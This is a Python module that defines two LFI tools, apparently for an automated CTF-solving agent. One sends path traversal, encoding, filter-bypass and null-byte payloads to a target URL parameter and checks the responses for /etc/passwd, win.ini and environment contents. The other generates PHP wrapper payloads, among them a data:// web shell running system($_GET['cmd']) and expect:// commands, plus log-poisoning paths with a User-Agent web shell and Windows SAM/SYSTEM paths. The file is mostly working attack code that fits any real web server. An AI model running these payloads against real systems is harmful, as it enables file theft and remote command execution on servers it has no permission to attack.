"""
LFI (Local/Remote File Inclusion) detection tools for CTF solving.

Provides utilities for detecting and exploiting file inclusion vulnerabilities
via path traversal, PHP wrappers, log poisoning, and encoding bypasses.
"""

import re
from typing import Dict, List, Optional, Tuple

import requests

from ctf_solver.tools.core import parse_json_input


class LfiProbeTool:
    """
    LfiProbeTool: test Local File Inclusion vulnerabilities via path traversal.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page?file=home",
          "param": "file",
          "method": "GET",                    # GET or POST (default GET)
          "data": {"other": "value"},         # optional extra form data
          "os_target": "linux",               # linux, windows, or both (default both)
          "depth": 5,                         # traversal depth 1-8 (default 5)
          "timeout": 10                       # optional timeout in seconds
        }

    The tool injects path traversal payloads and analyzes responses to detect
    LFI vulnerabilities, including encoding and filter bypasses.
    """

    name: str = "lfi_probe"
    description: str = (
        "Test Local File Inclusion (LFI) vulnerabilities by sending path traversal "
        "payloads to a target parameter. Input must be JSON with 'url' (target URL), "
        "'param' (parameter to inject into), optional 'method' (GET/POST, default GET), "
        "optional 'data' (extra form data), optional 'os_target' (linux/windows/both, "
        "default both), optional 'depth' (traversal depth 1-8, default 5), optional "
        "'timeout' (default 10). Returns analysis of which payloads revealed file "
        "contents or triggered LFI indicators."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "param": {"type": "string"},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            "data": {"type": "object"},
            "os_target": {
                "type": "string",
                "enum": ["linux", "windows", "both"],
                "default": "both",
            },
            "depth": {"type": "integer", "default": 5},
            "timeout": {"type": "integer", "default": 10},
        },
        "required": ["url", "param"],
        "additionalProperties": False,
    }
    samples = [{"url": "http://example.com/?file=", "param": "file"}]

    # Detection patterns by OS
    LINUX_PATTERNS: List[Tuple[str, str]] = [
        (r"root:x:0:0:", "Linux /etc/passwd (root entry)"),
        (r"daemon:x:", "Linux /etc/passwd (daemon entry)"),
        (r"/bin/bash", "Linux shell reference (/bin/bash)"),
        (r"/bin/sh", "Linux shell reference (/bin/sh)"),
        (r"localhost", "Hosts file (localhost)"),
    ]

    WINDOWS_PATTERNS: List[Tuple[str, str]] = [
        (r"\[boot loader\]", "Windows boot.ini"),
        (r"\[fonts\]", "Windows win.ini ([fonts])"),
        (r"\[extensions\]", "Windows win.ini ([extensions])"),
        (r"\[MCI Extensions\.BAK\]", "Windows win.ini ([MCI Extensions.BAK])"),
    ]

    ENV_PATTERNS: List[Tuple[str, str]] = [
        (r"DOCUMENT_ROOT=", "Environment variable (DOCUMENT_ROOT)"),
        (r"HTTP_HOST=", "Environment variable (HTTP_HOST)"),
        (r"PATH=", "Environment variable (PATH)"),
    ]

    # Flag patterns for CTF detection
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(picoctf\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(htb\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(thm\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with payload injected into parameter."""
        if method == "GET":
            params = {param: payload, **extra_data}
            return self.session.get(url, params=params, timeout=timeout)
        else:
            form_data = {param: payload, **extra_data}
            return self.session.post(url, data=form_data, timeout=timeout)

    def _responses_match(self, resp1_text: str, resp2_text: str) -> bool:
        """Check if two responses are essentially identical."""
        return resp1_text.strip() == resp2_text.strip()

    def _generate_payloads(self, os_target: str, depth: int) -> List[Tuple[str, str]]:
        """Generate path traversal payloads organized by category.

        Returns list of (payload, category) tuples.
        """
        payloads: List[Tuple[str, str]] = []

        # Determine target files based on OS
        linux_files = [
            "etc/passwd",
            "etc/hosts",
            "flag.txt",
            "flag",
        ]
        windows_files = [
            "Windows\\win.ini",
            "boot.ini",
            "Windows\\System32\\drivers\\etc\\hosts",
        ]

        target_files: List[str] = []
        if os_target in ("linux", "both"):
            target_files.extend(linux_files)
        if os_target in ("windows", "both"):
            target_files.extend(windows_files)

        # Basic traversal payloads at varying depths (1-8, capped by depth param)
        for d in range(1, min(depth, 8) + 1):
            traversal = "../" * d
            for f in target_files:
                payloads.append((f"{traversal}{f}", "basic_traversal"))

        # Encoding bypass payloads
        for d in range(1, min(depth, 8) + 1):
            # URL-encoded ../
            encoded_traversal = "..%2f" * d
            payloads.append((f"{encoded_traversal}etc%2fpasswd", "encoding_bypass"))

            # Double-dot URL-encoded
            dot_encoded = "%2e%2e%2f" * d
            payloads.append((f"{dot_encoded}etc/passwd", "encoding_bypass"))

            # Double URL-encoded ../
            double_encoded = "..%252f" * d
            payloads.append((f"{double_encoded}etc%252fpasswd", "encoding_bypass"))

        # Filter bypass payloads
        for d in range(1, min(depth, 4) + 1):
            # Double-dot bypass (....// -> ../ after filter strips ../)
            doubled = "..../" * d + "/" * d
            # Simplified: ....//
            filter1 = "....//....//....//etc/passwd"
            filter2 = "..;/..;/..;/etc/passwd"
            filter3 = "..\\/..\\/..\\/" + "etc/passwd"

        # Add unique filter bypass payloads
        payloads.append(("....//....//....//etc/passwd", "filter_bypass"))
        payloads.append(("..;/..;/..;/etc/passwd", "filter_bypass"))
        payloads.append(("..\\/..\\/..\\/" + "etc/passwd", "filter_bypass"))

        # Null byte payloads
        for d in range(1, min(depth, 4) + 1):
            traversal = "../" * d
            payloads.append((f"{traversal}etc/passwd%00", "null_byte"))
            payloads.append((f"{traversal}etc/passwd%00.jpg", "null_byte"))

        # Absolute path payloads
        absolute_paths = [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/self/environ",
        ]
        for p in absolute_paths:
            payloads.append((p, "absolute_path"))

        return payloads

    def _detect_content(self, response_text: str, os_target: str) -> List[str]:
        """Detect file content patterns in response text."""
        detections: List[str] = []

        patterns: List[Tuple[str, str]] = []
        if os_target in ("linux", "both"):
            patterns.extend(self.LINUX_PATTERNS)
        if os_target in ("windows", "both"):
            patterns.extend(self.WINDOWS_PATTERNS)
        patterns.extend(self.ENV_PATTERNS)

        for pattern, description in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detections.append(description)

        return detections

    def _extract_flags(self, response_text: str) -> List[str]:
        """Extract CTF flags from response text."""
        flags: List[str] = []
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, response_text)
            if match:
                flags.append(match.group(1))
        return flags

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "LfiProbeTool")
        if err:
            return err
        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[LfiProbeTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[LfiProbeTool] Error: 'param' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[LfiProbeTool] Error: 'method' must be 'GET' or 'POST'."

        os_target = (data.get("os_target") or "both").lower()
        if os_target not in ("linux", "windows", "both"):
            return "[LfiProbeTool] Error: 'os_target' must be 'linux', 'windows', or 'both'."

        depth = data.get("depth", 5)
        extra_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        # Get baseline response
        try:
            baseline_resp = self._make_request(
                url, method, param, "BASELINE_LFI_TEST", extra_data, timeout
            )
            baseline_text = baseline_resp.text
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_text)
        except Exception as exc:
            return f"[LfiProbeTool] Error: Failed to get baseline response: {exc}"

        # Generate payloads
        payloads = self._generate_payloads(os_target, depth)

        # Test each payload
        successful_payloads: List[Dict] = []
        flags_found: List[str] = []
        categories_tested: Dict[str, int] = {}

        for payload, category in payloads:
            categories_tested[category] = categories_tested.get(category, 0) + 1

            try:
                resp = self._make_request(
                    url, method, param, payload, extra_data, timeout
                )
                resp_text = resp.text

                # Skip if response matches baseline exactly
                if self._responses_match(baseline_text, resp_text):
                    continue

                # Check for file content patterns
                detections = self._detect_content(resp_text, os_target)

                # Check for flags
                resp_flags = self._extract_flags(resp_text)
                if resp_flags:
                    flags_found.extend(resp_flags)

                if detections or resp_flags:
                    entry: Dict = {
                        "payload": payload,
                        "category": category,
                        "status": resp.status_code,
                        "length": len(resp_text),
                        "detections": detections,
                    }
                    if resp_flags:
                        entry["flags"] = resp_flags
                    successful_payloads.append(entry)

            except Exception:
                pass  # Silently skip individual payload errors

        # Build output report
        output_lines = [
            "[LfiProbeTool] LFI Vulnerability Scan Results",
            "=" * 50,
            f"URL: {url}",
            f"Parameter: {param}",
            f"Method: {method}",
            f"OS Target: {os_target}",
            f"Traversal Depth: {depth}",
            f"Payloads Tested: {len(payloads)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        # Categories breakdown
        output_lines.append("PAYLOAD CATEGORIES:")
        for cat, count in sorted(categories_tested.items()):
            output_lines.append(f"  {cat}: {count} payloads")
        output_lines.append("")

        # Flags found
        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        # Successful payloads
        if successful_payloads:
            output_lines.append(
                f"VULNERABLE PAYLOADS ({len(successful_payloads)} found):"
            )
            output_lines.append("-" * 40)
            for item in successful_payloads:
                output_lines.append(f"  Payload: {item['payload']}")
                output_lines.append(f"    Category: {item['category']}")
                output_lines.append(
                    f"    Status: {item['status']}, Length: {item['length']}"
                )
                for detection in item.get("detections", []):
                    output_lines.append(f"    -> {detection}")
                for flag in item.get("flags", []):
                    output_lines.append(f"    -> FLAG: {flag}")
                output_lines.append("")
        else:
            output_lines.append("No LFI vulnerabilities detected with tested payloads.")
            output_lines.append("")

        # Summary
        output_lines.append("SUMMARY:")
        output_lines.append(f"  Vulnerable Payloads: {len(successful_payloads)}")
        output_lines.append(f"  Flags Found: {len(flags_found)}")
        output_lines.append("")

        # Recommendations
        output_lines.append("RECOMMENDATIONS:")
        if successful_payloads:
            output_lines.append("  - LFI confirmed! Try reading sensitive files.")
            output_lines.append(
                "  - Use lfi_payload_generator for PHP wrapper and log poisoning payloads."
            )
            output_lines.append(
                "  - Try /proc/self/environ for environment variable leakage."
            )
        else:
            output_lines.append("  - No LFI detected with basic traversal payloads.")
            output_lines.append(
                "  - Try PHP wrappers: php://filter/convert.base64-encode/resource=<file>"
            )
            output_lines.append(
                "  - Try different encoding bypasses or null byte injection."
            )
            output_lines.append("  - Consider testing with different depth values.")

        return "\n".join(output_lines)


class LfiPayloadGenerator:
    """
    LfiPayloadGenerator: generate LFI payloads for specific scenarios.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "traversal",         # traversal, php_wrappers, log_poisoning, windows_paths
          "target_file": "etc/passwd",      # optional target file
          "depth": 5                        # optional traversal depth (for traversal operation)
        }

    Operations:
      - traversal: path traversal payloads at various depths with encoding variants
      - php_wrappers: PHP stream wrapper payloads (filter, input, data, expect, zip, phar)
      - log_poisoning: common log file paths for log poisoning attacks
      - windows_paths: Windows-specific file paths for LFI
    """

    name: str = "lfi_payload_generator"
    description: str = (
        "Generate LFI payloads for specific attack scenarios. Input must be JSON with "
        "'operation' (traversal/php_wrappers/log_poisoning/windows_paths), optional "
        "'target_file' (file to target, default etc/passwd), optional 'depth' (traversal "
        "depth 1-10, default 5). Returns categorized payloads for the specified operation."
    )

    VALID_OPERATIONS = ("traversal", "php_wrappers", "log_poisoning", "windows_paths")

    def __init__(self) -> None:
        pass

    def _generate_traversal(self, target_file: str, depth: int) -> List[str]:
        """Generate traversal payloads at depths 1-10 with encoding variants."""
        payloads: List[str] = []
        max_depth = min(depth, 10)

        # Basic traversal at each depth
        for d in range(1, max_depth + 1):
            traversal = "../" * d
            payloads.append(f"{traversal}{target_file}")

        # Encoding variants at each depth
        for d in range(1, max_depth + 1):
            # URL-encoded ../
            payloads.append(f"{'..%2f' * d}{target_file}")
            # Dot-encoded
            payloads.append(f"{'%2e%2e%2f' * d}{target_file}")
            # Double URL-encoded
            payloads.append(f"{'..%252f' * d}{target_file}")
            # Backslash variant
            payloads.append(f"{'..\\\\' * d}{target_file}")

        # Filter bypass variants
        for d in range(1, min(max_depth, 5) + 1):
            payloads.append(f"{'..../' * d}/{'/..../' * (d - 1)}{target_file}")
            payloads.append(f"{'..;/' * d}{target_file}")

        # Null byte variants
        for d in range(1, min(max_depth, 5) + 1):
            traversal = "../" * d
            payloads.append(f"{traversal}{target_file}%00")
            payloads.append(f"{traversal}{target_file}%00.html")

        return payloads

    def _generate_php_wrappers(self, target_file: str) -> List[str]:
        """Generate PHP wrapper payloads."""
        payloads: List[str] = []

        # php://filter variants
        payloads.append(f"php://filter/convert.base64-encode/resource={target_file}")
        payloads.append(
            f"php://filter/read=convert.base64-encode/resource={target_file}"
        )
        payloads.append(f"php://filter/string.rot13/resource={target_file}")
        payloads.append(
            f"php://filter/convert.iconv.utf-8.utf-16/resource={target_file}"
        )

        # php://input (for POST body injection)
        payloads.append("php://input")

        # data:// wrapper
        payloads.append(
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        )
        payloads.append("data://text/plain,<?php system($_GET['cmd']);?>")

        # expect:// wrapper (requires expect extension)
        payloads.append("expect://id")
        payloads.append("expect://ls")

        # zip:// wrapper
        payloads.append("zip://shell.zip%23shell.php")
        payloads.append("zip:///tmp/shell.zip%23shell.php")

        # phar:// wrapper
        payloads.append("phar://shell.phar/shell.php")
        payloads.append("phar:///tmp/shell.phar/shell.php")

        return payloads

    def _generate_log_poisoning(self) -> List[str]:
        """Generate common log file paths for log poisoning attacks."""
        return [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/proc/self/environ",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/mail.log",
            "/var/log/vsftpd.log",
            "/var/mail/www-data",
        ]

    def _generate_windows_paths(self) -> List[str]:
        """Generate Windows-specific file paths for LFI."""
        return [
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\debug\\NetSetup.log",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\RegBack\\SAM",
            "C:\\Windows\\repair\\SAM",
            "C:\\Windows\\repair\\system",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
            "C:\\xampp\\apache\\conf\\httpd.conf",
            "C:\\xampp\\apache\\logs\\access.log",
            "C:\\xampp\\apache\\logs\\error.log",
        ]

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "LfiPayloadGenerator")
        if err:
            return err
        operation = data.get("operation", "").strip().lower()
        if not operation:
            return (
                "[LfiPayloadGenerator] Error: 'operation' is required. "
                f"Options: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[LfiPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Options: {', '.join(self.VALID_OPERATIONS)}"
            )

        target_file = data.get("target_file", "etc/passwd")
        depth = data.get("depth", 5)

        result_lines = [
            f"[LfiPayloadGenerator] Payloads for {operation.upper()}",
            "=" * 50,
        ]

        if operation == "traversal":
            result_lines.append(f"Target File: {target_file}")
            result_lines.append(f"Depth: {depth}")
            result_lines.append("")
            payloads = self._generate_traversal(target_file, depth)
            result_lines.append(f"Generated {len(payloads)} payloads:")
            result_lines.append("")
            for p in payloads:
                result_lines.append(f"  {p}")

        elif operation == "php_wrappers":
            result_lines.append(f"Target File: {target_file}")
            result_lines.append("")
            payloads = self._generate_php_wrappers(target_file)
            result_lines.append(f"Generated {len(payloads)} payloads:")
            result_lines.append("")
            for p in payloads:
                result_lines.append(f"  {p}")

        elif operation == "log_poisoning":
            result_lines.append("")
            payloads = self._generate_log_poisoning()
            result_lines.append(f"Common log file paths ({len(payloads)} entries):")
            result_lines.append("")
            for p in payloads:
                result_lines.append(f"  {p}")
            result_lines.append("")
            result_lines.append(
                "TIP: Inject PHP code via User-Agent header, then include the log file."
            )
            result_lines.append("  Example User-Agent: <?php system($_GET['cmd']); ?>")

        elif operation == "windows_paths":
            result_lines.append("")
            payloads = self._generate_windows_paths()
            result_lines.append(f"Windows file paths ({len(payloads)} entries):")
            result_lines.append("")
            for p in payloads:
                result_lines.append(f"  {p}")

        return "\n".join(result_lines)
